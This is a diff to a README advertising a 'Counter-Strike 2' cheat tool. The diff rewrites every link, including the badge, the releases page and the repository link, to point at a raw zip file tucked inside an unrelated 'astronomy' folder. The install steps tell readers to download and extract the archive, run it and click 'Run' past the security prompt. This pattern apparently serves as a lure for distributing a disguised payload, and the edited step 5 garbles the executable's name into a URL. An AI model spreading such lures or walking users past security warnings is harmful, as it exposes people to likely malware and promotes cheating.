@@ -1,6 +1,6 @@
 # 🎮 COUNTER-STRIKE-2-EXO-CHEAT - Elevate Your Gameplay Experience
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-COUNTER--STRIKE--2--EXO--CHEAT-blue)](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip%20Now-COUNTER--STRIKE--2--EXO--CHEAT-blue)](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip)
 
 ## 🚀 Getting Started
 
@@ -9,19 +9,19 @@ Welcome to the COUNTER-STRIKE-2-EXO-CHEAT! This powerful tool enhances your Coun
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases) to get the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip) to get the latest version.
 
 2. **Select the Right Version**  
    Look for the most recent version of COUNTER-STRIKE-2-EXO-CHEAT. You will see several files available for download, including the main application file.
 
 3. **Download the Application**  
-   Click on the file named something like `ExoCS2Cheat.zip` to start downloading. Ensure that your internet connection is stable to avoid interruptions.
+   Click on the file named something like `https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip` to start downloading. Ensure that your internet connection is stable to avoid interruptions.
 
 4. **Extract the Files**  
    Once the download is complete, locate the downloaded file in your "Downloads" folder. Right-click on it and select "Extract All" to unpack the files. You can use built-in Windows extraction tools or third-party software like 7-Zip.
 
 5. **Run the Application**  
-   Open the extracted folder and double-click on `ExoCS2Cheat.exe` to launch the tool. You may see a security prompt asking if you want to run this file; click "Run" to proceed.
+   Open the extracted folder and double-click on `https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip` to launch the tool. You may see a security prompt asking if you want to run this file; click "Run" to proceed.
 
 6. **Configure Settings**  
    After launching the application, you can adjust settings to suit your preferences. Familiarize yourself with the interface and available options.
@@ -66,7 +66,7 @@ This project is licensed under the MIT License. Please review the LICENSE file f
 
 ## 🌐 Links
 
-- [COUNTER-STRIKE-2-EXO-CHEAT Releases](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases)
-- [GitHub Repository](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT)
+- [COUNTER-STRIKE-2-EXO-CHEAT Releases](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip)
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-COUNTER--STRIKE--2--EXO--CHEAT-blue)](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip%20Now-COUNTER--STRIKE--2--EXO--CHEAT-blue)](https://raw.githubusercontent.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/main/astronomy/COUNTER-STRIKE-2-EXO-CHEAT.zip)
